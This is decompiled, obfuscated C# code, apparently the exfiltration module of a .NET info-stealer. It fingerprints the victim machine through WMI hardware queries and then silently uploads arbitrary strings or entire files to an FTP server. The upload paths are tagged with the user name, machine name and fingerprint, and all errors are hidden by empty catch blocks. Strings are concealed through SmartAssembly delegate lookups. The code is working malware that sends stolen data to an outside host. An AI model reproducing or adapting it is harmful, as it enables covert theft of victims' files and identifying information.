using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace RshJmeUGgeNp;

internal sealed class VLhifxtGlnnIec
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string QREtiKJahyEe()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107404650));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404629)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107404644);
		ManagementObject val3 = new ManagementObject(getString_0(107404639) + text2 + getString_0(107404566));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107404561)).ToString();
		return text3 + text;
	}

	public static void keKbdoVHKtVUJe(string rlBsNVNBsquYIAY = "URL", string IgeRkOXgrxz = "USERNAME", string ctUQcssxdcSKH = "ACCESO", string UaSiHcUleL = "")
	{
		try
		{
			string text = QREtiKJahyEe();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(rlBsNVNBsquYIAY + getString_0(107407913) + Environment.UserName + getString_0(107407900) + Environment.MachineName + getString_0(107407879) + text + getString_0(107407874));
			ftpWebRequest.Method = getString_0(107404536);
			ftpWebRequest.Credentials = new NetworkCredential(IgeRkOXgrxz, ctUQcssxdcSKH);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(UaSiHcUleL);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void OoNgWYAVfA(string TJGlHVlQUfVYPB = "URL", string GomZaQSkCCoDsj = "USERNAME", string eZaKzXATVWiR = "ACCESO", string LbSDjjqSXn = "")
	{
		try
		{
			string text = QREtiKJahyEe();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(TJGlHVlQUfVYPB + getString_0(107407913) + Environment.UserName + getString_0(107407900) + Environment.MachineName + getString_0(107407879) + text + getString_0(107407879) + Path.GetFileName(LbSDjjqSXn));
			ftpWebRequest.Method = getString_0(107404536);
			ftpWebRequest.Credentials = new NetworkCredential(GomZaQSkCCoDsj, eZaKzXATVWiR);
			byte[] array = File.ReadAllBytes(LbSDjjqSXn);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static VLhifxtGlnnIec()
	{
		Strings.CreateGetStringDelegate(typeof(VLhifxtGlnnIec));
	}
}
